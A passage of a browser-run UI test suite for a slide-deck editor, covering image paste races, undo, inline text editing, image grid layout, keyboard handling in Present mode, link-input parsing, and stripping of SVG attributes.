    await _mrdInject([{ type: "heading", text: "TL-RACE-A" }], { layout: undefined }, (vp) => vp?.textContent.includes("TL-RACE-A") ? vp : null);
    await _waitFor(() => _m1RowTitles().includes("TL-RACE-A"), 2000);
    const before = _m1RowTitles(), i = before.indexOf("TL-RACE-A");
    await _tlPasteBig();
    _click(_tocRows()[i].querySelector("[data-testid='toc-slide-delete']"));
    await _wait(2500);
    const after = _m1RowTitles();
    const want = before.filter((_, k) => k !== i).join("|");
    await _mrdUndoTo(past);
    if (after.join("|") !== want) throw new Error(`slide list after delete: ${after.join("|")} (expected ${want})`);
  }},
  { name: "paste race: Ctrl+Z right after a paste stays undone", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    await _mrdInject([{ type: "heading", text: "TL-RACE-B" }], { layout: undefined }, (vp) => vp?.textContent.includes("TL-RACE-B") ? vp : null);
    await _mrdInject([{ type: "heading", text: "TL-RACE-B-E1" }], { layout: undefined }, (vp) => vp?.textContent.includes("TL-RACE-B-E1") ? vp : null);
    await _tlPasteBig();
    document.activeElement?.blur?.();
    _key("z", { ctrlKey: true });
    await _wait(2500);
    const vp = _mrdViewport(), text = vp.textContent, imgs = vp.querySelectorAll("img").length;
    await _mrdUndoTo(past);
    if (text.includes("TL-RACE-B-E1") || !text.includes("TL-RACE-B")) throw new Error("the undone edit came back");
    if (imgs) throw new Error(`${imgs} image(s) added after the undo`);
  }},
  { name: "paste race: an image paste into an open inline edit keeps the typed text", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    const vp = await _mrdInject([{ type: "heading", text: "TL-RACE-C" }], { layout: undefined }, (v) => v?.textContent.includes("TL-RACE-C") ? v : null);
    const disp = Array.from(vp.querySelectorAll("[data-block-type='heading'] div")).find((d) => d.textContent === "TL-RACE-C" && d.style.cursor === "pointer");
    if (!disp) throw new Error("heading text is not editable");
    _click(disp);
    const ed = await _waitFor(() => vp.querySelector("[data-block-type='heading'] [contenteditable]"), 1500);
    ed.focus();
    const sel = window.getSelection(); sel.selectAllChildren(ed); sel.collapseToEnd();
    document.execCommand("insertText", false, "-TYPED");
    const cv = document.createElement("canvas"); cv.width = 64; cv.height = 64;
    const blob = await new Promise((r) => cv.toBlob(r, "image/png"));
    const dt = new DataTransfer(); dt.items.add(new File([blob], "c.png", { type: "image/png" }));
    ed.dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
    await _wait(1200);
    const stillEditing = document.activeElement === ed;
    ed.blur();
    await _wait(300);
    const text = _mrdViewport().textContent, imgs = _mrdViewport().querySelectorAll("img").length;
    await _mrdUndoTo(past);
    if (!stillEditing) throw new Error("the paste closed the inline edit");
    if (!text.includes("TL-RACE-C-TYPED")) throw new Error("typed text was dropped");
    if (imgs) throw new Error("the paste into the inline edit added an image");
  }},
], { setup: _selectFirstModule });

// ── Review fixes: app markers, inline paste, cols AI edit, review cycle,
// string checklist items ──
const _rfxPast = () => (_hooks().getHistoryCounts ? _hooks().getHistoryCounts().past : 0);
// A node inside the slide content with an app marker stands in for deck markup
// that carries one (the sanitizer drops them; this checks the app does not trust them).
const _rfxPlant = (attrs, style) => {
  const host = _$("[data-vela-slide-content]");
  if (!host) throw new Error("no slide content to plant a marker in");
  const n = document.createElement("div");
  for (const [k, v] of Object.entries(attrs)) n.setAttribute(k, v);
  if (style) n.style.cssText = style;
  host.appendChild(n);
  return n;
};
uiSuite("review-fix-editor", [
  { name: "S1: app markers inside slide content do not change Esc or fullscreen exit in Present", fn: async () => {
    const planted = [];
    try {
      document.activeElement?.blur?.(); _key("f");
      await _waitFor(() => !_$("header"), 2000);
      planted.push(_rfxPlant({ "data-vela-modal": "" }), _rfxPlant({ "data-vela-zoom": "" }));
      _key("Escape");
      await _waitFor(() => _$("header"), 2000).catch(() => { throw new Error("Esc did not leave Present (a deck marker read as an open modal)"); });
      planted.forEach((n) => n.remove()); planted.length = 0;
      document.activeElement?.blur?.(); _key("f");
      await _waitFor(() => !_$("header"), 2000);
      planted.push(_rfxPlant({ "data-vela-zoom": "" }));
      document.dispatchEvent(new Event("fullscreenchange"));
      await _waitFor(() => _$("header"), 2000).catch(() => { throw new Error("browser fullscreen exit kept Present (a deck marker read as an open zoom)"); });
    } finally {
      planted.forEach((n) => n.remove());
      await _exitFullscreen();
    }
  }},
  { name: "S1: an editor-overlay marker inside slide content does not move the block toolbar", fn: async () => {
    const past = _rfxPast();
    let plant = null;
    try {
      await _mrdInject([{ type: "heading", text: "RFX toolbar", size: "2xl" }], null, (vp) => vp && vp.querySelector("[data-block-type='heading']"));
      const barRect = async () => {
        // Query the block each time: the slide can re-mount it after the inject.
        await _wait(150);
        const el = _mrdViewport().querySelector("[data-block-type='heading']");
        await _mrdHover(el);
        const bar = await _waitFor(() => el.querySelector("[data-testid='block-hover-toolbar']"), 1500);
        await _mrdFrame();
        const r = bar.getBoundingClientRect();
        await _mrdUnhover(el);
        return r;
      };
      const before = await barRect();
      plant = _rfxPlant({ "data-editor-overlay": "deck" }, "position:absolute;inset:0;pointer-events:none");
      const after = await barRect();
      if (Math.abs(after.left - before.left) > 1) throw new Error(`toolbar moved ${Math.round(before.left - after.left)}px for a marker in slide content`);
    } finally {
      plant?.remove();
      await _mrdUndoTo(past);
    }
  }},
  { name: "S3: paste into an inline text editor inserts plain text only", fn: async () => {
    const past = _rfxPast();
    try {
      await _mrdInject([{ type: "heading", text: "RFX paste", size: "2xl" }], null, (vp) => vp?.textContent.includes("RFX paste") ? vp : null);
      _click(await _waitFor(() => _tlEditNode("RFX paste"), 2000));
      const ed = await _waitFor(() => _$("[contenteditable='true']", _mrdViewport()), 1500);
      const dt = new DataTransfer();
      dt.setData("text/html", "<b>RFX-RICH</b><img src='data:image/gif;base64,R0lGODlhAQABAAAAACw='>");
      dt.setData("text/plain", "RFX-PLAIN");
      const ev = new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true });
      ed.dispatchEvent(ev);
      await _mrdFrame();
      if (!ev.defaultPrevented) throw new Error("the inline editor left the paste to the browser (rich paste)");
      if (ed.querySelector("img, b")) throw new Error("rich markup reached the inline editor");
      if (!ed.textContent.includes("RFX-PLAIN")) throw new Error(`plain text was not inserted (got "${ed.textContent}")`);
      _key("Escape");
    } finally {
      document.activeElement?.blur?.();
      await _mrdUndoTo(past);
    }
  }},
  { name: "E1: AI block edit on a two-column block writes back to that column", fn: async () => {
    const past = _rfxPast();
    const orig = { ready: window.__velaAgentReady, send: window.__velaAgentSend, gate: window.__velaTrustGate };
    try {
      window.__velaAgentReady = true;
      window.__velaTrustGate = null;
      window.__velaAgentSend = async () => JSON.stringify({ type: "text", text: "RFX-AI-LEFT" });
      const sel = "[data-cols-side='left'] [data-block-type='text']";
      const el = await _mrdInject([], { layout: "cols", L: [{ type: "text", text: "RFX left" }], R: [{ type: "text", text: "RFX right" }] }, (vp) => vp && vp.querySelector(sel));
      await _mrdHover(el);
      _click(await _waitFor(() => el.querySelector("[data-testid='block-hover-toolbar'] button[title='Edit this block with AI']"), 2000));
      const inp = await _waitFor(() => _$("[data-testid='block-ai-popup'] input", _mrdViewport()), 2000);
      _mrdSetRange(inp, "make it say RFX-AI-LEFT");
      await _mrdFrame();
      inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
      await _waitFor(() => _hooks().getCurrentSlideForTest?.()?.L?.[0]?.text === "RFX-AI-LEFT", 4000)
        .catch(() => { throw new Error("the AI edit did not reach the left column block"); });
      const s = _hooks().getCurrentSlideForTest();
      if ((s.blocks || []).length) throw new Error("the AI edit added a block to the main blocks list");
      if (s.R?.[0]?.text !== "RFX right") throw new Error("the AI edit changed the right column");
    } finally {
      window.__velaAgentReady = orig.ready; window.__velaAgentSend = orig.send; window.__velaTrustGate = orig.gate;
      await _wait(300);
      await _mrdUndoTo(past);
    }
  }},
  { name: "E6: review cycle steps within the current module when its lane is collapsed", fn: async () => {
    if (_tocRows().length < 2) throw new Error("need >=2 slide rows");
    const hooks = _hooks();
    if (typeof hooks.toggleSelectedLaneForTest !== "function") throw new Error("toggleSelectedLaneForTest hook missing");
    const cyc = () => _$("[data-testid='review-cycle-toggle']");
    let collapsed = false;
    try {
      await _m1ClickRow(0);
      const start = hooks.getSelection();
      const reviewed = hooks.getCurrentSlideForTest?.();
      if (!start || start.slideIdx !== 0 || !reviewed) throw new Error("could not select slide 1");
      collapsed = hooks.toggleSelectedLaneForTest(); await _mrdFrame();
      _click(cyc());
      await _waitFor(() => cyc()?.getAttribute("aria-pressed") === "true", 1500);
      document.activeElement?.blur?.();
      _key("ArrowRight");
      await _waitFor(() => { const s = hooks.getSelection(); return s && s.itemId === start.itemId && s.slideIdx === 1; }, 1500)
        .catch(() => { const s = hooks.getSelection(); throw new Error(`ArrowRight left the module or jumped (now ${s?.itemId === start.itemId ? "same" : "other"} module, slide ${s?.slideIdx})`); });
    } finally {
      if (cyc()?.getAttribute("aria-pressed") === "true") _click(cyc());
      if (collapsed) hooks.toggleSelectedLaneForTest();
      await _mrdFrame();
      await _m1ClickRow(0).catch(() => {});
    }
  }},
  { name: "E10: string checklist items edit inline; untouched items stay strings", fn: async () => {
    const past = _rfxPast();
    try {
      await _mrdInject([{ type: "checklist", items: ["RFX alpha", "RFX beta", "RFX gamma"] }], null, (vp) => vp?.textContent.includes("RFX gamma") ? vp : null);
      await _wait(150); // the slide can re-mount its blocks just after the inject
      await _tlEdit("PENDING", "done", "DONE");
      await _tlEdit("RFX beta", "RFX beta edited");
      const items = _hooks().getCurrentSlideForTest()?.blocks?.[0]?.items || [];
      if (items[0]?.text !== "RFX alpha" || items[0]?.status !== "done") throw new Error(`label edit on a string item gave ${JSON.stringify(items[0])}`);
      if (items[1]?.text !== "RFX beta edited") throw new Error(`text edit on a string item gave ${JSON.stringify(items[1])}`);
      if (items[2] !== "RFX gamma") throw new Error(`an untouched item changed form: ${JSON.stringify(items[2])}`);
    } finally {
      await _mrdUndoTo(past);
    }
  }},
], { setup: _editorSetup });

// Helpers for the CR23 stress matrix and the paste-race tests above.
const _tlColors = ["#3b82f6", "#10b981", "#f59e0b", "#ef4444", "#8b5cf6"];
const _tlCanvas = (a, k) => { const cv = document.createElement("canvas"); cv.height = 300; cv.width = Math.max(1, Math.round(300 * a)); const g = cv.getContext("2d"); g.fillStyle = _tlColors[k % 5]; g.fillRect(0, 0, cv.width, cv.height); return cv; };
const _tlPasteCanvas = async (cv) => {
  const blob = await new Promise((r) => cv.toBlob(r, "image/png"));
  const dt = new DataTransfer(); dt.items.add(new File([blob], "p.png", { type: "image/png" }));
  _mrdViewport().dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
};
const _tlPasteBig = async () => { const cv = document.createElement("canvas"); cv.width = 3000; cv.height = 2000; cv.getContext("2d").fillRect(0, 0, 3000, 2000); await _tlPasteCanvas(cv); };
const _tlLoaded = (vp) => Array.from(vp?.querySelectorAll("img") || []).filter((im) => im.complete && im.naturalWidth > 0).length;
const _tlStressMeasure = () => {
  const vp = _mrdViewport(), v = vp.getBoundingClientRect(), s = v.width / 960, off = [];
  vp.querySelectorAll("[data-block-type]").forEach((el) => {
    if (el.dataset.blockType === "image") return;
    const r = el.getBoundingClientRect();
    if (r.width && (r.left < v.left - 1 || r.top < v.top - 1 || r.right > v.right + 1 || r.bottom > v.bottom + 1)) off.push(el.dataset.blockType);
  });
  const imgs = Array.from(vp.querySelectorAll("img")).map((im) => {
    const r = im.getBoundingClientRect(), k = Math.min(r.width / im.naturalWidth, r.height / im.naturalHeight);
    const w = im.naturalWidth * k, h = im.naturalHeight * k, cx = r.left + r.width / 2, cy = r.top + r.height / 2;
    if (cx - w / 2 < v.left - 1 || cx + w / 2 > v.right + 1 || cy - h / 2 < v.top - 1 || cy + h / 2 > v.bottom + 1) off.push("image");
    return { w: w / s, h: h / s, scale: k / s, src: im.getAttribute("src") };
  });
  const grid = vp.querySelector("[data-testid='image-grid']");
  return { off, imgs, area: imgs.reduce((t, i) => t + i.w * i.h, 0), split: !!vp.querySelector("[data-split-image]"), cols: grid ? Number(grid.getAttribute("data-image-cols")) : 1 };
};
const _tlStressCase = async (c) => {
  const n = c.aspects.length, body = TL_STRESS_BODIES[c.body];
  const label = `${c.body}:[${c.aspects.map((a) => a.toFixed(2)).join(",")}]`;
  const past = _hooks().getHistoryCounts().past;
  const base = { layout: undefined, contentFlex: undefined, imageFlex: undefined, imageCols: undefined };
  const settle = async () => { await _wait(350); await _mrdFrame(); };
  try {
    await _mrdInject([...body, ...c.aspects.slice(0, -1).map((a, k) => ({ type: "image", src: _tlCanvas(a, k).toDataURL("image/png") }))], base, (vp) => _tlLoaded(vp) >= n - 1 && vp.querySelectorAll("img").length === n - 1 ? vp : null);
    await _tlPasteCanvas(_tlCanvas(c.aspects[n - 1], n - 1));
    await _waitFor(() => _tlLoaded(_mrdViewport()) >= n, 4000);
    await _wait(150); await settle();
    const chosen = _tlStressMeasure();
    if (chosen.off.length) throw new Error(`${label}: off the slide: ${chosen.off.join(",")}`);
    const big = chosen.imgs.find((i) => i.scale > 2.02);
    if (big) throw new Error(`${label}: image shown at ${big.scale.toFixed(2)}x natural size`);
    const blocks = [...body, ...chosen.imgs.map((i) => ({ type: "image", src: i.src }))];
    const [cf, imf] = pasteSplitFlex(n, c.aspects[n - 1]);
    const splitProps = { layout: "image-right", contentFlex: cf, imageFlex: imf, imageCols: undefined };
    const render = async (props, ready) => { await _mrdInject(blocks, props, (vp) => _tlLoaded(vp) === n && ready(vp) ? vp : null); await settle(); return _tlStressMeasure(); };
    const alts = [];
    if (body.length) {
      const other = await render(chosen.split ? base : splitProps, (vp) => !!vp.querySelector("[data-split-image]") !== chosen.split);
      alts.push([chosen.split ? "stack" : "split", other.area]);
    }
    if (n >= 2) {
      const cols = gridColsFor(n, chosen.split ? "half" : "full");
      const eq = await render({ ...(chosen.split ? splitProps : base), imageCols: cols }, (vp) => vp.querySelector("[data-testid='image-grid']")?.getAttribute("data-image-cols") === String(cols) && !!vp.querySelector("[data-split-image]") === chosen.split);
      alts.push([`uniform ${cols}-col grid`, eq.area]);
    }
    const best = alts.reduce((b, a) => (a[1] > b[1] ? a : b), ["chosen", chosen.area]);
    return { label, ratio: chosen.area / best[1], detail: `${chosen.split ? "split" : "stack"} ${Math.round(chosen.area)} px2 vs ${best[0]} ${Math.round(best[1])} px2` };
  } finally { await _mrdUndoTo(past); }
};

uiSuite("review-fix-shortcuts", [
  { name: "Ctrl+E inside a text input does not toggle the TOC", fn: async () => {
    const tocShown = () => _$$(".concept-row").length > 0;
    if (!tocShown()) throw new Error("TOC not shown at start");
    const inp = document.createElement("input");
    document.body.appendChild(inp);
    try {
      inp.focus();
      _key("e", { ctrlKey: true });
      await new Promise((r) => setTimeout(r, 150));
      if (!tocShown()) throw new Error("Ctrl+E in an input toggled the TOC");
    } finally { if (inp.parentNode) inp.parentNode.removeChild(inp); }
  }},
], { setup: _selectFirstModule });

// ── Review fixes: image grid and image paste ────────────────────────────
const _rfiCanvas = (w, h, k) => { const cv = document.createElement("canvas"); cv.width = w; cv.height = h; const g = cv.getContext("2d"); g.fillStyle = _tlColors[k % 5]; g.fillRect(0, 0, w, h); return cv; };
const _rfiSrc = (w, h, k) => _rfiCanvas(w, h, k).toDataURL("image/png");
const _rfiPasteFile = (file) => {
  const dt = new DataTransfer(); dt.items.add(file);
  _mrdViewport().dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
};
const _rfiPng = async (w, h, k) => { const blob = await new Promise((r) => _rfiCanvas(w, h, k).toBlob(r, "image/png")); return new File([blob], `r${k}.png`, { type: "image/png" }); };
uiSuite("review-fix-image", [
  { name: "E2: a solo full-bleed image is not click-to-zoom", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const vp = await _mrdInject([{ type: "image", src: _rfiSrc(400, 300, 0) }], { imageCols: undefined }, (v) => _tlLoaded(v) === 1 ? v : null);
      if (!vp.querySelector("[data-testid='image-grid']")) throw new Error("the solo image left the grid path");
      if (vp.querySelector("[data-vela-zoomable]")) throw new Error("the solo image has a zoom wrapper");
      _click(vp.querySelector("img"));
      await _wait(200);
      const zoom = document.querySelector("[data-vela-zoom]");
      if (zoom) { zoom.click(); throw new Error("a click on the solo image opened the zoom overlay"); }
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "E3: a short last grid row is centered exactly (auto and pinned imageCols)", fn: async () => {
    const cases = [[5, undefined], [7, undefined], [2, 6], [3, 2], [5, 4]];
    for (const [n, cols] of cases) {
      const past = _hooks().getHistoryCounts().past;
      try {
        const blocks = Array.from({ length: n }, (_, k) => ({ type: "image", src: _rfiSrc(300, 300, k) }));
        const vp = await _mrdInject(blocks, { imageCols: cols }, (v) => _tlLoaded(v) === n ? v : null);
        await _wait(300); await _mrdFrame();
        const grid = vp.querySelector("[data-testid='image-grid']"), g = grid.getBoundingClientRect(), s = vp.getBoundingClientRect().width / 960;
        const rows = new Map();
        grid.querySelectorAll("[data-testid='image-grid-cell']").forEach((c) => { const r = c.getBoundingClientRect(), key = Math.round(r.top); rows.set(key, [...(rows.get(key) || []), r]); });
        if (rows.size < 2 && !(cols > n)) throw new Error(`${n} images, imageCols ${cols}: expected a short row, got ${rows.size} row(s)`);
        for (const rs of rows.values()) {
          const L = (Math.min(...rs.map((r) => r.left)) - g.left) / s, R = (g.right - Math.max(...rs.map((r) => r.right))) / s;
          if (Math.abs(L - R) > 1) throw new Error(`${n} images, imageCols ${cols}: row of ${rs.length} has margins ${L.toFixed(1)} / ${R.toFixed(1)} px`);
        }
      } finally { await _mrdUndoTo(past); }
    }
  }},
  { name: "E4: an undecodable image in a paste burst adds no block, shows a notice and keeps the rest", fn: async () => {
    const past = _hooks().getHistoryCounts().past, mark = "RFI-E4";
    try {
      await _mrdInject([{ type: "heading", text: mark }], { imageCols: undefined }, (vp) => vp?.textContent.includes(mark) && !vp.querySelector("img") ? vp : null);
      const good = [await _rfiPng(140, 90, 0), await _rfiPng(220, 90, 1)];
      const bad = new File([new Uint8Array([73, 73, 42, 0, 1, 2, 3, 4, 5, 6, 7, 8])], "bad.tif", { type: "image/tiff" });
      _rfiPasteFile(good[0]); _rfiPasteFile(bad); _rfiPasteFile(good[1]);
      const notice = await _waitFor(() => document.querySelector("[data-testid='paste-notice']"), 4000).catch(() => null);
      let got = [];
      await _waitFor(() => { got = Array.from(_mrdViewport().querySelectorAll("img")).filter((im) => im.complete && im.naturalWidth > 0).map((im) => im.naturalWidth); return got.length >= 2; }, 6000).catch(() => {});
      await _wait(400);
      const imageBlocks = _mrdViewport().querySelectorAll("[data-block-type='image']").length;
      if (imageBlocks !== 2) throw new Error(`${imageBlocks} image block(s) on the slide (expected 2)`);
      if (got.join(",") !== "140,220") throw new Error(`images on the slide: ${got.join(",") || "none"} (expected 140,220 in paste order)`);
      if (!notice) throw new Error("no notice for the image that could not be pasted");
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "E8: a fault in one paste is logged and the paste queue stays alive", fn: async () => {
    const past = _hooks().getHistoryCounts().past, mark = "RFI-E8";
    const warn = console.warn, warned = [], layoutFn = pasteImageLayout;
    try {
      await _mrdInject([{ type: "heading", text: mark }], { imageCols: undefined }, (vp) => vp?.textContent.includes(mark) && !vp.querySelector("img") ? vp : null);
      console.warn = (...a) => { warned.push(a); };
      pasteImageLayout = () => { throw new Error("rfi-e8-fault"); };
      _rfiPasteFile(await _rfiPng(100, 80, 2));
      await _waitFor(() => warned.length > 0, 3000).catch(() => {});
      pasteImageLayout = layoutFn;
      console.warn = warn;
      _rfiPasteFile(await _rfiPng(160, 80, 3));
      const ok = await _waitFor(() => _tlLoaded(_mrdViewport()) === 1, 4000).catch(() => null);
      if (!warned.some((a) => a.some((x) => x && x.message === "rfi-e8-fault"))) throw new Error("the paste fault was not logged");
      if (!ok) throw new Error("the paste after the fault did not land");
    } finally { pasteImageLayout = layoutFn; console.warn = warn; await _mrdUndoTo(past); }
  }},
  { name: "E7: a grid image whose natural-size cache entry was evicted stays visible", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const blocks = [{ type: "image", src: _rfiSrc(320, 200, 0) }, { type: "image", src: _rfiSrc(200, 320, 1) }];
      await _mrdInject(blocks, { imageCols: undefined }, (v) => _tlLoaded(v) === 2 ? v : null);
      await _mrdFrame();
      blocks.forEach((b) => IMAGE_NATURAL_SIZE.delete(b.src));
      const vp = await _mrdInject(blocks, { imageCols: undefined, gap: 14 }, (v) => v);
      await _wait(150); await _mrdFrame();
      const hidden = Array.from(vp.querySelectorAll("img")).filter((im) => getComputedStyle(im).visibility === "hidden").length;
      if (hidden) throw new Error(`${hidden} on-screen image(s) hidden after a cache eviction`);
      if (!blocks.every((b) => IMAGE_NATURAL_SIZE.has(b.src))) throw new Error("the evicted natural sizes were not measured again");
    } finally { await _mrdUndoTo(past); }
  }},
], { setup: _selectFirstModule });

uiSuite("hunt1-fix-sanitize", [
  { name: "HE4: the link box saves no link for free text, no-dot hosts, userinfo and other schemes", fn: async () => {
    // Runs in the real browser URL parser (Chromium percent-encodes a space in a
    // host where Node throws, so "garbage text" is only provable here).
    const cases = [
      ["garbage text", undefined], ["example", undefined], ["a@b", undefined], ["x@y.z/path", undefined],
      ["sms:123", undefined], ["tel:5551234", undefined], ["..", undefined], ["user:pw@example.com", undefined],
      ["example.com", "https://example.com/"], ["example.com:8080/x", "https://example.com:8080/x"],
      ["me@example.com", "mailto:me@example.com"], ["https://example.org/p", "https://example.org/p"],
    ];
    for (const [input, want] of cases) {
      const got = linkFromInput(input);
      if (got !== want) throw new Error(`linkFromInput(${JSON.stringify(input)}) = ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
    }
  }},
  { name: "HS3: a rendered deck SVG carries no class/role/aria-*/tabindex/autofocus; id refs stay", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const markup = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" class="status-btn" role="tree" tabindex="0" autofocus="" aria-modal="true">'
        + '<defs><linearGradient id="h1g"><stop offset="0" stop-color="#f00"/></linearGradient></defs>'
        + '<rect class="slide-nav-btn" role="button" aria-label="x" tabindex="-1" fill="url(#h1g)" width="5" height="5"/></svg>';
      const vp = await _mrdInject([{ type: "svg", markup }], null, (v) => (v && v.querySelector("linearGradient#h1g")) ? v : null);
      // The deck's own <svg> (app chrome such as lucide icons carries its own class).
      const root = vp.querySelector("linearGradient#h1g").closest("svg");
      const els = [root, ...root.querySelectorAll("*")];
      const leaked = [];
      for (const el of els) {
        for (const a of el.attributes) if (/^(class|role|tabindex|autofocus|aria-.*)$/i.test(a.name)) leaked.push(`${el.localName}@${a.name}=${a.value}`);
      }
      if (!els.some((el) => el.localName === "rect")) throw new Error("the deck SVG did not render in an svg block");
      if (leaked.length) throw new Error("attributes kept on deck SVG: " + leaked.join(", "));
      const rect = vp.querySelector("rect[fill='url(#h1g)']");
      if (!rect) throw new Error("the url(#id) gradient ref was lost");
    } finally { await _mrdUndoTo(past); }
  }},
], { setup: _selectFirstModule });

// hunt1-fix-editor: Esc/arrow order with an open zoom or Present TOC, hover
// cluster that covers no item text, IME Enter in the inline editors.
const _hfeZoomed = () => !!document.querySelector("[data-vela-zoom]");
const _hfeZoomables = () => Array.from(document.querySelectorAll("[data-vela-zoomable]")).filter((z) => z.getBoundingClientRect().width > 0 && !z.closest("[data-vela-zoom]"));
const _hfeTocPanel = () => { let p = _$("input[placeholder^='Search slides']"); while (p && !(p.style && /^translateX/.test(p.style.transform || ""))) p = p.parentElement; return p; };
const _hfeTocOpen = () => /^translateX\(0(px)?\)$/.test(_hfeTocPanel()?.style.transform || "");
const _hfeHits = (a, b) => a.left < b.right - 0.5 && a.right > b.left + 0.5 && a.top < b.bottom - 0.5 && a.bottom > b.top + 0.5;
const _hfeTextNode = (root, t) => { const w = document.createTreeWalker(root, NodeFilter.SHOW_TEXT); for (let n = w.nextNode(); n; n = w.nextNode()) if (n.nodeValue.trim() === t) return n; return null; };
uiSuite("hunt1-fix-editor", [
  { name: "HE1: with focus off the zoom overlay, Esc closes only the zoom and arrows step the zoom, not the slide", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      await _mrdInject([{ type: "image", src: _rfiSrc(320, 200, 0) }, { type: "image", src: _rfiSrc(200, 320, 1) }], { imageCols: undefined }, (v) => _tlLoaded(v) === 2 ? v : null);
      await _mrdFrame();
      for (const mode of ["editor", "present"]) {
        if (mode === "present") { document.activeElement?.blur?.(); _key("f"); await _waitFor(() => !_$("header"), 2000); }
        const open = async () => { _click(await _waitFor(() => _hfeZoomables()[0], 2000)); await _waitFor(_hfeZoomed, 2000); document.activeElement?.blur?.(); await _mrdFrame(); };
        await open();
        const pos = _slidePos();
        _key("ArrowRight"); await _wait(250);
        if (_slidePos() !== pos) throw new Error(`${mode}: ArrowRight moved the slide behind the zoom`);
        if (!_hfeZoomed()) throw new Error(`${mode}: ArrowRight did not step to the next zoomable image`);
        document.activeElement?.blur?.();
        _key("Escape");
        await _waitFor(() => !_hfeZoomed(), 1500).catch(() => { throw new Error(`${mode}: Esc did not close the zoom`); });
        await _wait(200);
        if (mode === "present" && _$("header")) throw new Error("present: Esc with a zoom open also left Present");
        if (mode === "editor" && !_$("header")) throw new Error("editor: Esc changed the view");
      }
    } finally {
      if (_hfeZoomed()) window.dispatchEvent(new Event("vela-close-zoom"));
      await _exitFullscreen();
      await _mrdUndoTo(past);
    }
  }},
  { name: "HE6: Esc with the Present TOC open closes the TOC first and keeps Present", fn: async () => {
    try {
      document.activeElement?.blur?.(); _key("f");
      await _waitFor(() => !_$("header"), 2000);
      _key("e", { ctrlKey: true });
      await _waitFor(_hfeTocOpen, 2000);
      await _wait(150);
      document.activeElement?.blur?.();
      _key("Escape");
      await _waitFor(() => !_hfeTocOpen(), 1500).catch(() => { throw new Error("Esc did not close the Present TOC"); });
      await _wait(200);
      if (_$("header")) throw new Error("Esc with the Present TOC open left Present");
      // Browser-fullscreen path: the browser eats Esc and only fires fullscreenchange.
      _key("e", { ctrlKey: true });
      await _waitFor(_hfeTocOpen, 2000);
      document.dispatchEvent(new Event("fullscreenchange"));
      await _waitFor(() => !_hfeTocOpen(), 1500).catch(() => { throw new Error("browser fullscreen exit did not close the Present TOC"); });
      await _wait(200);
      if (_$("header")) throw new Error("browser fullscreen exit with the Present TOC open left Present");
      document.activeElement?.blur?.();
      _key("Escape");
      await _waitFor(() => _$("header"), 2000).catch(() => { throw new Error("the next Esc did not leave Present"); });
    } finally { await _exitFullscreen(); }
  }},
  { name: "HE2/HE3: the item hover cluster covers no item text; a click on short text edits it", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const sets = [
        [[{ type: "tag-group", items: [{ text: "ht1" }, { text: "ht2" }, { text: "ht3" }] }, { type: "comparison", items: [{ title: "Before", items: ["ha1", "ha2"] }, { title: "After", items: ["hb1"] }] }], ["ht1", "ht2", "ht3", "ha1", "ha2", "hb1"]],
        [[{ type: "steps", items: [{ title: "hs1" }, { title: "hs2" }] }, { type: "progress", items: [{ label: "hg1", value: 5 }, { label: "hg2", value: 9 }] }], ["hs1", "hs2", "hg1", "hg2"]],
      ];
      let seen = 0;
      for (const [blocks, labels] of sets) {
        const vp = await _mrdInject(blocks, { align: "center" }, (v) => labels.every((t) => _hfeTextNode(v, t)) ? v : null);
        await _wait(400); // entrance animation
        for (const t of labels) {
          const n = _hfeTextNode(vp, t);
          const host = n.parentElement;
          await _mrdHover(host); await _mrdFrame();
          const cl = _$("[data-item-cluster]", vp);
          if (cl) {
            seen++;
            const rg = document.createRange(); rg.selectNodeContents(n);
            const tr = rg.getBoundingClientRect();
            const over = Array.from(cl.querySelectorAll("button")).find((b) => _hfeHits(b.getBoundingClientRect(), tr));
            if (over) throw new Error(`"${over.title}" covers the text "${t}"`);
            const hit = document.elementFromPoint(tr.left + tr.width / 2, tr.top + tr.height / 2);
            if (hit?.closest("button")) throw new Error(`a click on "${t}" lands on "${hit.closest("button").title}"`);
          }
          await _mrdUnhover(host);
        }
      }
      if (seen < 8) throw new Error(`only ${seen} item hover clusters were shown`);
      // Click the middle tag: it edits, it is not deleted.
      const vp = await _mrdInject(sets[0][0], { align: "center" }, (v) => _hfeTextNode(v, "ht2") ? v : null);
      await _wait(400);
      const host = _hfeTextNode(vp, "ht2").parentElement;
      await _mrdHover(host); await _mrdFrame();
      const rg = document.createRange(); rg.selectNodeContents(_hfeTextNode(vp, "ht2"));
      const tr = rg.getBoundingClientRect();
      _click(document.elementFromPoint(tr.left + tr.width / 2, tr.top + tr.height / 2));
      await _waitFor(() => _$("[contenteditable='true']", _mrdViewport()), 1500).catch(() => { throw new Error("a click on a short tag did not start the inline edit"); });
      _key("Escape"); await _mrdFrame();
      const tags = (_hooks().getCurrentSlideForTest()?.blocks?.[0]?.items || []).map((i) => i.text).join();
      if (tags !== "ht1,ht2,ht3") throw new Error(`the click changed the tags: ${tags}`);
    } finally {
      document.activeElement?.blur?.();
      await _mrdUndoTo(past);
    }
  }},
  { name: "HE5: Enter during IME composition does not commit the inline text or SVG label editor", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    const ime = (el) => el.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", keyCode: 229, isComposing: true, bubbles: true, cancelable: true }));
    const enter = (el) => el.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", keyCode: 13, bubbles: true, cancelable: true }));
    try {
